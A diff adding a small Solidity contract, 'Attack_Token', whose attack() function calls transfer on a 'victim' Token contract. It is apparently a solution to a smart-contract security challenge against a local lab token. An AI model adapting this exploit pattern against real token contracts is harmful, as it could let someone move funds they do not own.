@@ -1,0 +1,14 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Token.sol";
+contract Attack_Token {
+    Token public victim;
+    constructor (address _victim) {
+        victim = Token(_victim);
+    }
+
+    function attack(address _to, uint256 _value) public {
+        victim.transfer(_to, _value);
+    }
+}
